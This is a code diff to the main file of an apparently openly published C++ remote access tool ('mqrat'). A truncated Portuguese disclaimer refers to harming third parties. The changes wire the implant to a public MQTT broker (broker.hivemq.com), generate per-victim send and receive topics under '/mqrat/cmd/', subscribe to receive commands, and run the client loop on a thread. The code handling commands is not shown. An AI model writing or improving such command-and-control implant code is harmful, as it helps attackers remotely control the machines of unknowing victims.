@@ -7,26 +7,28 @@
 	que estejam sendo utilizadas para prejudicar terceiros.
 */
 
+#ifndef __cplusplus
+#error "We need a C++ compiler"
+#endif
+
 #include <thread>
 #include <string>
 #include <functional>
 #include "mqtt_client.hpp"
 #include "log.hpp"
 #include "utils.hpp"
+#include "network.hpp"
 
 using namespace std;
 
-string topic_name = "/mqrat/cmd/";
-
 int main() {
+	string topic_name = "/mqrat/cmd/";
+	unsigned QoS = 1;
 
-	MqttClient *client = new MqttClient(0, "broker.hivemqt.com");
+	MqttClient *client = new MqttClient(QoS, "tcp://broker.hivemq.com:1883");
 
     // Configure MQTT client
     client->Setup();
-
-	// Connect to broker
-	client->Connect();
 
 	// Generate send and receive topic
 	auto recv_topic = topic_name + Utils::GenerateID();
@@ -35,18 +37,18 @@ int main() {
 	client->setRecvTopic(recv_topic);
 	client->setSendTopic(send_topic);
 
+	// Connect to broker
+	client->Connect();
+
 	// Subscribe to topic where command will be received
 	client->Subscribe(recv_topic);
 
 	// Internal loop
-	std::thread mqtt_thread(&MqttClient::Loop);
+	std::thread mqtt_thread(&MqttClient::Loop, client);
 	
-#ifdef TEST
-	Log::LogInfo("Started mqtt thread");
-#else
+	Log::LogInfo("Started MQTT client thread");
 	if(mqtt_thread.joinable())
 		mqtt_thread.join();
-#endif
-
+	
     return 0;
 }
